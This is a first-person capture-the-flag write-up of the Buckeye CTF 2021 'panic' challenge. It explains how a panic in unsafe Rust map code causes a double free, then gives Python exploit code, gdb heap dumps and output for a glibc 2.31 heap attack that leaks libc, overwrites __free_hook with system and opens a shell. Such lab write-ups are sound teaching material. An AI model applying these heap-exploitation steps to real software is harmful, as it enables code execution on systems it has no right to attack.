# Buckeye CTF 2021 - Panic Writeup

This is my writeup for panic for the Buckeye CTF, and my first writeup in general. This writeup doubles as some teaching material
and a view of my train of thought, so it may be a bit long and verbose in sections.

# First Analysis

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Interesting... the binary has almost all of the mitigations enabled, which means ~~either they won't do anything or~~ that we're in for a slog. In this case, it's a bit of one and a lot of the other.


## Source Code Review

Rust source code is easier to audit(TM) compared to C(++) code, because you *usually* only need  to look at the unsafe blocks (here, we have three mainly), or so was the common wisdom for a while. This is only partially correct.
[Infectious unsafety](https://www.ralfj.de/blog/2016/01/09/the-scope-of-unsafe.html) means that anything unsafe code touches or relies upon is suspect, and our first job should be to audit the `safe_map.rs` module, which is ironically very unsafe.

```rust
impl<K: Hash + Eq, V> Drop for Slot<K, V> {
    fn drop(&mut self) {
        let mut cur = self.entry;
        while !cur.is_null() {
            unsafe {
                let e = Box::from_raw(cur);
                cur = (*e).next;
                // println!("Slot, dropping {}", e.val);
                // explicitly free each Entry
                drop(e);
            }
        }
    }
}
```
This code simply traverses the linked list, freeing each slot iteratively to avoid a stack overflow. A simple `println` at the top of the method assures us it is never called until the program shuts down. Useless.

```rust
fn get_mut<'a>(&'a mut self, k: &K) -> Option<&'a mut V> {
    let mut cur = self.entry;
    while !cur.is_null()  {
        unsafe {
            if (*cur).key == *k {
                return Some(&mut (*cur).val)
            }
            cur = (*cur).next
        }
    }
    None
}
```
This code traverses a `Slot` and checks for an exact key match (likely to avoid hash collisions). If we could somehow mess with this linked list, we could dereference arbitrary pointers, but alas the list seems resistant to tampering.

```rust
// maps values in-place
fn map_values<F>(&mut self, mut f: F) where F: (FnMut(&K, V) -> V) + Copy {
    let mut cur = self.entry;
    while !cur.is_null()  {
        unsafe {
            let mut e = ptr::read(cur);

            // map
            e.val = f(&e.key, e.val);
            
            ptr::write(cur, e);
            cur = (*cur).next;
        }
    }
}
```
This code looks very suspect. We manifest a temporary `e`, of type `Entry<K, V>` from the pointer `cur`, and run a user supplied function on it.
Afterwards, we then write `e` back to `cur`. `ptr::write`  swallows  the destructor call, but [as described here](https://github.com/sslab-gatech/Rudra#panic-safety-unsafe-code-that-can-create-memory-safety-issues-when-panicked),
Rust functions can panic (and closures), and because the stack then unwinds, the destructor for `e` gets called. Let's look at the destructor for `Entry`,

```rust
struct Entry<K: Hash + Eq, V> {
    key: K,
    val: V,
    next: *mut Entry<K, V>
}
```
I lied. There are no explicit destructors, but the destructors of the generic type will implicitly get called. Let's take a look at the
generic parameters we'll be working with, as well as the user call to `map_values`.

```rust
#[derive(Debug)]
pub struct Account {
    full_name: String,
    balance: i64,
}

fn give_administrators_big_bonuses(accounts: &mut Store<String, Account>) {
    let result = could_panic!((|| {
        accounts.map_values(|_key, mut account: Account| -> Account {
            account.balance += 1000;
            account
        });
    }));

    match result {
        Err(_) => println!("Failed to give administrators large bonuses."),
        Ok(_) => println!("All is well")
    }
}
```
Ahha. Due to RAII, dropping an `Entry<String, Account>` will drop 2 things that we actually care about, a heap-allocated string representing the key,
and a heap allocated string representing the full name. Now the closure on the other hand is a bit more difficult. Arithmetic operations can't panic in Rust...

```
from rust:1.55 as builder

WORKDIR /challenge
COPY . .

# Yes, we are running a debug build
RUN cargo build
```
Are we on a debug build? Ahhh.

## Double Free Primitive

Alright. Now my first thought was that we could call `give_administrators_big_bonuses` a lot of times to get an overflow, but it seems like the organizers
took pity on us. `make_payment` is supposed to allow you to pay off your balance, but due to the lack of negative checking, you can use it to go into debt instead!
Woo-hoo! If we take on a bunch of debt (to the tune of 9223372036854775800), then when the greedy admins give themselves raises, an overflow will occur. Let's
test this.

```
> 2
Please enter your account number: A
How much would you like to pay? -9223372036854775800
<snip>
> 4
thread 'main' panicked at 'attempt to add with overflow', src/main.rs:109:13
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace        
Failed to give administrators large bonuses.
<snip>
> 4
thread 'main' panicked at 'attempt to add with overflow', src/main.rs:109:13
free(): double free detected in tcache 2
Aborted
```

## UAF Primitive

In theory there's a simple use-after-free in the program (simply reqquset thte balance of a freed account, and on small enough string sizes that does appear to be
the case. Our `key` is freed alongside the `full_name` however, so it's a lot more difficult than other CTFs where you can simply type a number...

# Heap Exploitation

I'm not the best at heap exploitation, nor am I that good at explaining how the heap works, so if you're brand new to this, consider these few resources.

- https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks
- https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/
- https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627

## Mitigations

Remember when I said foreshadowed that the checksec mitigations might've been useless. Well, that's not really the case. PIE upgrades the challenge by making us
find a libc leak in addition to an arbitrary write.

In additioon, this program is also using libc 2.31, so some mitigations have been put in place. Let's discuss them alongside our game plan.

We can allocate arbitrary sized objects, so the most obvious way to get the libc address is to use the unsorted bins. These bins are doubly-linked and point back
to an internal libc structure eventually, but we can bypass that by ensuring our chunk is the only one in the unsorted bin.

The maximum size for fastbins is 80 bytes, so if we allocate something not too much larger, say 128 bytes. For allocations of these size, the objects will first go into
a simple cache called the tcache. This cache is quite useless as it contains no pointers to anything of value, and in addition, we can't free anything currently already in
the tcache (glibc will run a linear scan as a sanity check). Luckikly, the tcache only contains at most 7 freed chunks of any given size, so if we manage to fill it,
allocations of 128 bytes should go straight into the unsorted bin. Let's try it.

## Free(dom and) Order

Trying out that technique led to a bunch of the items not getting freed before one was double-freed, causing an abort (stop addding mitigations glibc). Let's look at
how`map_values` is called on each slot.

```rust
pub fn map_values<F>(&mut self, f: F) where F: (FnMut(&K, V) -> V) + Copy {
    for slot in &mut self.slots {
        slot.map_values(f);
    }
}
```
So each slot is freed from 0 to 15, and each slot is freed according to the linked list (which by code review is a LIFO). I [ran this code](https://play.rust-lang.org/?version=nightly&mode=debug&edition=2021&gist=cb3edd2b944a79266aa1e056248279d6)
for several values of width  and then hardcoded them into my Python script, so I can choose which bins to place items into. I can know control the order of the frees, although
finangling everything into the right bins and at what times is still going to be a challenge.

# Leaking libc

## Boilerplate
```python
def pop_id(bins, b):
    return bins[b].pop(0).encode("ascii")
    
eight = solver_data.eight()
foureight = solver_data.foureight()
sixfour = solver_data.sixfour()
onetwoeight = solver_data.onetwoeight()
```

`bins` takes one of the 4 sizes to determine how long the string should be, and `b` to determine which bin you want an account placed into. I've also created
some functions that simply wrap the menu choices, simply to make it easier on myself when actually writing the exploit.

## For real this time
Before we do anything, our malloc bins look like this.
```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55d5f91fbad0 (size : 0x1e530)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x80)   tcache_entry[6](1): 0x55d5f91f9480
(0x100)   tcache_entry[14](1): 0x55d5f91f9910
(0x1e0)   tcache_entry[28](1): 0x55d5f91f92a0
```
Now recall that our key gets freed in addition to the name payload. If we want to access the content again to perform a UAF read, we'd need to predict what
happens to the key after it gets freed. Luckily, the fastbins provide a way out. The first 8 bytes of the allocated content in a fastbin (once freed)
point to the next chunk. If we could fill the tcache up and make this the first element in the fastbin, we could control the exact content of `key`. The next
pointer would then be null (setting the first 8 bytes to null), and because Rust strings are not C strings (they have a length instead of being null-terminated),
the comparison works perfectly fine. With a bit of testing to ensure that both forms would map to the same bucket,
the key `0000000033100000000000000000000000000000000000000000000000000000` was found.

Next up was simply iterating and testing the code. I experimentally determined the values I needed to fill up the tcache and no more, (there's some fun/weird
allocation shenanigans going on, but that's for a bit later). We make the sizes of the id and the name differ to make sure they don't colliide and make our
job harder.

```python
num_fill_tcache = 5 # 5 x 128 bytes + 5 x 64 bytes
for i in range(num_fill_tcache):
    t = pop_id(sixfour, 14)
    new_acct(t, b'A' * 128)
    free_in_x_funds(t, i + 1)
    p.clean()

# 1 x 128 bytes
t1 = pop_id(onetwoeight, 14)
new_acct(t1, b'')
free_in_x_funds(t1, num_fill_tcache + 1)
num_fill_tcache = num_fill_tcache + 1
p.clean()

# 64 bit string calculated that replacing the first 8 bytes
# with \u{0} won't change the hash
first_uaf = b"0000000033100000000000000000000000000000000000000000000000000000" # bin 13
new_acct(first_uaf, b'A' * 128)
free_in_x_funds(first_uaf, num_fill_tcache + 2)
p.clean()

for i in range(num_fill_tcache + 2):
    run_funds()
    p.clean()
```
The first `num_fill_tcache +  1` frees fill up the tcache, and the last free frees the id of `first_uaf` into the fastbin and the name into the unsorted bin.
```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x563d03def330 --> 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x563d03def480 (size : 0x1db80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x563d03def0e0 (size : 0x90)
(0x20)   tcache_entry[0](1): 0x563d03deed40
(0x50)   tcache_entry[3](7): 0x563d03def0a0 --> 0x563d03deef70 --> 0x563d03deee40 --> 0x563d03deecf0 --> 0x563d03deeb30 --> 0x563d03def390 --> 0x563d03def3e0
(0x60)   tcache_entry[4](1): 0x563d03def430
(0x80)   tcache_entry[6](1): 0x563d03dec480
(0x90)   tcache_entry[7](7): 0x563d03def220 --> 0x563d03deefc0 --> 0x563d03deee90 --> 0x563d03deed60 --> 0x563d03deec10 --> 0x563d03deeb80 --> 0x563d03def2b0
(0x100)   tcache_entry[14](1): 0x563d03dec910
(0x1e0)   tcache_entry[28](1): 0x563d03dec2a0
```
Perfect.

```python
# this only gets the name, we don't care
# about our debt, just like
addr = get_balance(b'\x00' * 8 + first_uaf[8:])[:8]
<snip>
heap_ptr = u64(addr)
print(f"Leaked unsorted bin {heap_ptr}")
libc_base = heap_ptr - 0x1ebbe0 # determined through experimentation
print(f"Leaked libc base {heap_ptr}")
```
Sidenote: jupyter notebooks for pwn (especially heap) would be quite pog

## Arbitrary writes

Now that we have libc, we just need an arbitrary write primitive. The easiest one I know is to free an allocation into both the tcache
and the freelist, sort of what we have [in this how2heap example (fastbin_reverse_into_tcache)](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c).
The general idea is to convince malloc that a custom pointer we provide (while freed in the fastbin) is actually the pointer to the next chunk, so after enough allocations we get
malloc to return an arbitrary pointer.

You'll see a common theme here is to fill the tcache with a bunch of objects to defeat the mitigations put in place. This time, I chose the bucket containg size 48 (I think it's sized at 64), large enough that I would have some
flexibility, but also small enough to not be cumbersome and not interact with the previously corrupted bins (mucking with those is an easy way to crash the program).

```python
# we don't care about the 7 x 8 bytes
# 7 x 48 bytes to fill
num_tcache_again = 7
for i in range(num_tcache_again):
    t = pop_id(foureight, 12)
    new_acct(t, b'')
    free_in_x_funds(t, i + 1)
    p.clean()

for i in range(num_tcache_again):
    run_funds()
    p.clean()
```

```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x5577b30edd30 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x5577b30ee6c0 --> 0x5577b30ee600 --> 0x0
(0x50)     fastbin[3]: 0x5577b30ee330 --> 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5577b30ee740 (size : 0x1d8c0)
       last_remainder: 0x5577b30ee140 (size : 0x30)
            unsortbin: 0x0
(0x20)   tcache_entry[0](7): 0x5577b30ee650 --> 0x5577b30ee5f0 --> 0x5577b30ee590 --> 0x5577b30ee530 --> 0x5577b30ee4d0 --> 0x5577b30ee0f0 --> 0x5577b30ee6b0
(0x30)   tcache_entry[1](1): 0x5577b30ee150
(0x40)   tcache_entry[2](7): 0x5577b30ee5b0 --> 0x5577b30ee550 --> 0x5577b30ee4f0 --> 0x5577b30ee490 --> 0x5577b30ee110 --> 0x5577b30ee670 --> 0x5577b30ee710
(0x60)   tcache_entry[4](1): 0x5577b30ee430
(0x80)   tcache_entry[6](1): 0x5577b30eb480
(0x90)   tcache_entry[7](7): 0x5577b30ee220 --> 0x5577b30edfc0 --> 0x5577b30ede90 --> 0x5577b30edd60 --> 0x5577b30edc10 --> 0x5577b30edb80 --> 0x5577b30ee2b0
(0x100)   tcache_entry[14](1): 0x5577b30eb910
(0x1e0)   tcache_entry[28](1): 0x5577b30eb2a0
```
And 7 entries in the tcache. Now we just need to allocate 7 entries to free it and we're set.
```python
for i in range(7):
    t = pop_id(foureight, 1)
    new_acct(t, b'')
    p.clean()
    
# the last chunk in the original 7 chunks
# will be freed twice, once into the fastbin
# and once into the tcache
run_funds()
```
```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x5577b30edd30 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5577b30ee920 (size : 0x1d6e0)
       last_remainder: 0x5577b30ee140 (size : 0x30)
            unsortbin: 0x0
(0x20)   tcache_entry[0](7): 0x5577b30ee650 --> 0x5577b30ee5f0 --> 0x5577b30ee590 --> 0x5577b30ee530 --> 0x5577b30ee4d0 --> 0x5577b30ee0f0 --> 0x5577b30ee6b0
(0x30)   tcache_entry[1](1): 0x5577b30ee150
(0x40)   tcache_entry[2](3): 0x5577b30ee6d0 --> 0x5577b30ee5b0 --> 0x5577b30ee610
(0x60)   tcache_entry[4](1): 0x5577b30ee430
(0x80)   tcache_entry[6](1): 0x5577b30eb480s
(0x90)   tcache_entry[7](7): 0x5577b30ee220 --> 0x5577b30edfc0 --> 0x5577b30ede90 --> 0x5577b30edd60 --> 0x5577b30edc10 --> 0x5577b30edb80 --> 0x5577b30ee2b0
(0x100)   tcache_entry[14](1): 0x5577b30eb910
(0x1e0)   tcache_entry[28](1): 0x5577b30eb2a0
```
Huh????? Where did my fastbin entry go? Oh, they might've been promoted into the tcache (rules for which are quite frankly arcane and I don't really understand). Hmmm....

Note: heapinfoall_s are collected seperately, so addresses may differ from one to another due to ASLR - focus on their quantity

## Wait what
Maybe off by one error? Let's try only allocating 6 instead of 7.
```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x564abb627d30 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x564abb6286c0 --> 0x564abb628600 --> 0x0
(0x50)     fastbin[3]: 0x564abb628330 --> 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x564abb628740 (size : 0x1d8c0)
       last_remainder: 0x564abb628140 (size : 0x30)
            unsortbin: 0x0
(0x20)   tcache_entry[0](7): 0x564abb628650 --> 0x564abb6285f0 --> 0x564abb628590 --> 0x564abb628530 --> 0x564abb6284d0 --> 0x564abb6280f0 --> 0x564abb6286b0
(0x30)   tcache_entry[1](1): 0x564abb628150
(0x40)   tcache_entry[2](7): 0x564abb6285b0 --> 0x564abb628550 --> 0x564abb6284f0 --> 0x564abb628490 --> 0x564abb628110 --> 0x564abb628670 --> 0x564abb628710
(0x60)   tcache_entry[4](1): 0x564abb628430
(0x80)   tcache_entry[6](1): 0x564abb625480
(0x90)   tcache_entry[7](7): 0x564abb628220 --> 0x564abb627fc0 --> 0x564abb627e90 --> 0x564abb627d60 --> 0x564abb627c10 --> 0x564abb627b80 --> 0x564abb6282b0
(0x100)   tcache_entry[14](1): 0x564abb625910
(0x1e0)   tcache_entry[28](1): 0x564abb6252a0
```
Nope, the tcache and fastbin combined contain more than one entry. And on further reading it does look like whenever glibc needs to go into the fastbin,
it moves some elements to the tcache as an optimization. Something must be allocating multiple copies and then freeing them. Let's take a look.

```rust
fn new_account(accounts: &mut Store<String, Account>) {
    if let (Some(acct_id), Some(full_name)) = (prompt_for("Account ID: "), prompt_for("Full Name: ")) {
        let result = could_panic!((|| {
            accounts.set(acct_id, Account { full_name: full_name.clone(), balance: 0 });
<snip>
}
```
Ah. Here we see an extra copy (clone) of the `full_name`, likely so it can be printed (this explains why some of the earlier numbers to fill the tcache
had to be experimentally found). But `acct_id` is moved, so it wouldn't explain this. Let's look at `prompt_for`.

```rust
fn prompt_for(s: &str) -> Option<String> {
    let mut input = vec![];
<snip>
    let input_s = String::from_utf8(input).ok()?;
    return Some(input_s.trim().to_string())
}
```
Ohh. `from_utf8` doesn't make any extra copies, only verifiying the data, but `trim().to_string()` does. If we could make the input string
larger than the trim, it should hopefully free that allocation when growing, letting the trimed string take it.

```python
for i in range(6):
    t = pop_id(foureight, 1)
    new_acct(t, b'')
    p.clean()

bypass_trim = pop_id(foureight, 1).ljust(128, b' ')
# trim technique to only allocate once in bin
new_acct(bypass_trim, b'')
p.clean()

# we still need to free bad_chunk once more,
# so it goes to the tcache and not the fastbin
run_funds()
p.clean()
```


```
(gdb) heapinfoall

(0x20)     fastbin[0]: 0x56460e1d9d30 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x56460e1da6c0 (overlap chunk with 0x56460e1da6c0(freed) )
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x56460e1da920 (size : 0x1d6e0)
       last_remainder: 0x56460e1da140 (size : 0x30)
            unsortbin: 0x0
(0x20)   tcache_entry[0](7): 0x56460e1da650 --> 0x56460e1da5f0 --> 0x56460e1da590 --> 0x56460e1da530 --> 0x56460e1da4d0 --> 0x56460e1da0f0 --> 0x56460e1da6b0
(0x30)   tcache_entry[1](1): 0x56460e1da150
(0x40)   tcache_entry[2](1): 0x56460e1da6d0
(0x60)   tcache_entry[4](1): 0x56460e1da430
(0x80)   tcache_entry[6](1): 0x56460e1d7480
(0x90)   tcache_entry[7](7): 0x56460e1da220 --> 0x56460e1d9fc0 --> 0x56460e1d9e90 --> 0x56460e1d9d60 --> 0x56460e1d9c10 --> 0x56460e1d9b80 --> 0x56460e1da2b0
(0x100)   tcache_entry[14](1): 0x56460e1d7910
(0x1e0)   tcache_entry[28](1): 0x56460e1d72a0
```
heapinfoall knows... It knows too well...

## Arbitrary write primitive (a primitive way indeed)
Homeeeeee sweeeeet homeeeeeee. Let's set up this chunk so that allocating two more times will give us the `__free_hook`. The first 8 bytes that we can write to of a fastbin
(remember a fastbin extends back behind the pointer we are given) contains the address for the next bin. Overwriting that should make malloc return an arbitrary pointer,
giving us an arbitrary write primitive. There are checks/mitigations to make sure the jump location is sane, but it appears (?) like we lucked out on this binary, as
the simple offset of 16 works.

This simple offset is of size 16 because in libc 2.31 there are two addresses stored behind the writable pointer we are given. If we were to run into
mitigations, we could extend the offset backwards even more to hopefully land in a memory location that bypasses them due to preexisting/uninitalized memory.

```python
free_hook = libc_base + libc.sym.__free_hook
# write 16 bytes backwards as fastbins
# reserve 16 bytes for internal metadata
# this allocates ... ughhh
try_free = p64(free_hook - 16).ljust(48, b'A') + b' ' * 128
new_acct(try_free, b'')
p.clean()
```
```
Account ID: Full Name: Could not read account name.
```
What? This only occurs if `prompt_for` fails, which only occurs when (scrolls up) the string is invalid UTF-8, or reading in from terminal fails. Probably the former
considering the bitpacked ints. Luckily, it sometimes doesn't error, so I can probably just ... add a `while True:` and some error checking.

Is it time?

```python
system = libc_base + libc.sym.system
try_system = p64(system).ljust(48, b'A')
# UTF-8 decode error here still lets
# us pwn, so don't care about it
# ditto for double allocation, I think
# it actually helps us? idk its black magic
new_acct(try_system, b'')
p.clean()

print("1, and then /bin/sh")
p.interactive()
```

After a couple of tries:
```
[+] Opening connection to pwn.chall.pwnoh.io on port 13381: Done
Leaked unsorted bin 140100212210656
Leaked libc base 140100212210656
Restarting due to UTF-8 decode failure
[*] Closed connection to pwn.chall.pwnoh.io port 13381
[+] Opening connection to pwn.chall.pwnoh.io on port 13381: Done
Leaked unsorted bin 140464348724192
Leaked libc base 140464348724192
Restarting due to UTF-8 decode failure
[*] Closed connection to pwn.chall.pwnoh.io port 13381
[+] Opening connection to pwn.chall.pwnoh.io on port 13381: Done
Leaked unsorted bin 139973726051296
Leaked libc base 139973726051296
1, and then /bin/sh
[*] Switching to interactive mode
$ 1
Please enter your account number: $ /bin/sh
$ ls
flag.txt
panic
$ cat flag.txt
buckeye{p4n1c_15_n0t_ab0rt}
```
## Conclusion

For my first hard heap challenge, and my first actual writeup, I think this was a lot more painful than I expected going in. I didn't have the willpower
to stomach finishing this during the contest, but after having done it - it wasn't too bad? Anyways, for all of the curveballs, this was a pretty standard libc 2.31 
heap pwn. I'm kinda scared for what'll have to be done once challenges move to 2.34 and beyond...
